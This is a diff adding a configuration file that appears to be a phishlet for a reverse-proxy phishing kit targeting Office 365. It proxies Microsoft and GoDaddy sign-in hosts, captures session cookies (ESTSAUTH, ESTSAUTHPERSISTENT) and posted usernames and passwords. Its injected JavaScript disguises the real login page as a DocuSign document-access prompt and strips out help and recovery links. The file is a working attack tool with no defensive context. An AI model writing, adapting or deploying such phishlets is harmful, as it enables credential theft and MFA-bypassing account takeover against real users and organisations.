@@ -1,0 +1,144 @@
+name: "o365"
+author: "@jamescullum"
+min_ver: "2.3.0"
+
+proxy_hosts:
+  - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true }
+  - { phish_sub: "www", orig_sub: "www", domain: "office.com", session: false, is_landing: false }
+  - { phish_sub: "login", orig_sub: "login", domain: "microsoft.com", session: true, is_landing: true }
+  - { phish_sub: "sso", orig_sub: "sso", domain: "godaddy.com", session: true, is_landing: false }
+  - { phish_sub: "sso", orig_sub: "sso", domain: "godaddy.com:443", session: true, is_landing: false }
+
+sub_filters:
+  - triggers_on: "login.microsoftonline.com"
+    orig_sub: "login"
+    domain: "microsoftonline.com"
+    search: 'href="https://{hostname}'
+    replace: 'href="https://{hostname}'
+    mimes: ["text/html", "application/json", "application/javascript"]
+
+  - triggers_on: "login.microsoftonline.com"
+    orig_sub: "login"
+    domain: "microsoftonline.com"
+    search: "https://{hostname}"
+    replace: "https://{hostname}"
+    mimes: ["text/html", "application/json", "application/javascript"]
+    redirect_only: true
+
+  - triggers_on: "sso.godaddy.com"
+    orig_sub: "login"
+    domain: "microsoftonline.com"
+    search: "https://{hostname}"
+    replace: "https://{hostname}"
+    mimes: ["text/html", "application/json", "application/javascript"]
+
+auth_tokens:
+  - domain: ".login.microsoftonline.com"
+    keys: ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"]
+
+credentials:
+  username:
+    key: "(login|UserName)"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "(passwd|Password|accesspass)"
+    search: "(.*)"
+    type: "post"
+
+login:
+  domain: "login.microsoftonline.com"
+  path: "/"
+
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/oauth2/v2.0/authorize", "/common/oauth2/v2.0/authorize*"]
+    script: |
+      function waitForElements(selectors, callback) {
+        const interval = setInterval(() => {
+          const elements = selectors.map(sel => document.querySelector(sel));
+          if (elements.every(el => el !== null)) {
+            clearInterval(interval);
+            callback(...elements);
+          }
+        }, 50);
+      }
+
+      waitForElements(
+        ["#lightbox", "#i0116", "#idSIButton9", "#loginHeader"],
+        (lightbox, emailInput, submitBtn, headerTitle) => {
+          document.querySelectorAll('[data-test-id="signinOptions"]').forEach(el => {
+            const tile = el.closest(".tile-container");
+            if (tile) tile.remove();
+          });
+
+          const backBtn = document.getElementById("idBtn_Back");
+          if (backBtn) backBtn.parentElement.remove();
+
+          document.querySelectorAll("#signup, #cantAccessAccount").forEach(link => {
+            const formGroup = link.closest(".form-group");
+            if (formGroup) formGroup.remove();
+          });
+
+          const logoImg = document.querySelector('img.logo');
+          if (logoImg) {
+            logoImg.src = "https://cloudmasonry.com/wp-content/uploads/2020/06/DocuSign-Logo.png";
+            logoImg.style.width = "100px";
+            logoImg.style.margin = "0 0 20px 0";
+          }
+
+          if (headerTitle) {
+            headerTitle.querySelector("div").textContent = "Secure Login: Email Check";
+            headerTitle.style.marginBottom = "12px";
+            headerTitle.style.fontSize = "22px";
+            headerTitle.style.color = "#004e9b";
+
+            const subtitle = document.createElement("p");
+            subtitle.textContent = "Access to this document is restricted to Authorised users only. kindly enter you email";
+            subtitle.style.fontSize = "13px";
+            subtitle.style.margin = "4px 0 12px 0";
+            subtitle.style.color = "#333";
+            headerTitle.appendChild(subtitle);
+          }
+
+          const inputRow = emailInput.closest(".form-group");
+          if (inputRow) {
+            const description = document.createElement("p");
+            description.textContent = "This document is accessible by authorized users only. Please provide your email for access.";
+            description.style.fontSize = "14px";
+            description.style.marginBottom = "10px";
+            inputRow.insertBefore(description, emailInput);
+          }
+
+          emailInput.placeholder = "Enter your email";
+          emailInput.style.border = "1px solid #0078d4";
+          emailInput.style.borderRadius = "6px";
+          emailInput.style.padding = "12px";
+          emailInput.style.fontSize = "16px";
+          emailInput.style.width = "100%";
+          emailInput.style.boxSizing = "border-box";
+
+          submitBtn.value = "Continue";
+          submitBtn.style.height = "42px";
+          submitBtn.style.fontSize = "16px";
+          submitBtn.style.backgroundColor = "#0067b8";
+          submitBtn.style.color = "white";
+          submitBtn.style.border = "none";
+          submitBtn.style.borderRadius = "6px";
+          submitBtn.style.marginTop = "14px";
+          submitBtn.style.cursor = "pointer";
+          submitBtn.onmouseover = () => (submitBtn.style.backgroundColor = "#005fa3");
+          submitBtn.onmouseout = () => (submitBtn.style.backgroundColor = "#0067b8");
+
+          let errorSpan = document.getElementById("error_uname_doc");
+          if (!errorSpan) {
+            errorSpan = document.createElement("span");
+            errorSpan.id = "error_uname_doc";
+            errorSpan.textContent = "Please, provide a valid email.";
+            errorSpan.style.color = "red";
+            errorSpan.style.display = "none";
+            errorSpan.style.fontSize = "13px";
+            emailInput.insertAdjacentElement("afterend", errorSpan);
+          }
+        }
+      );
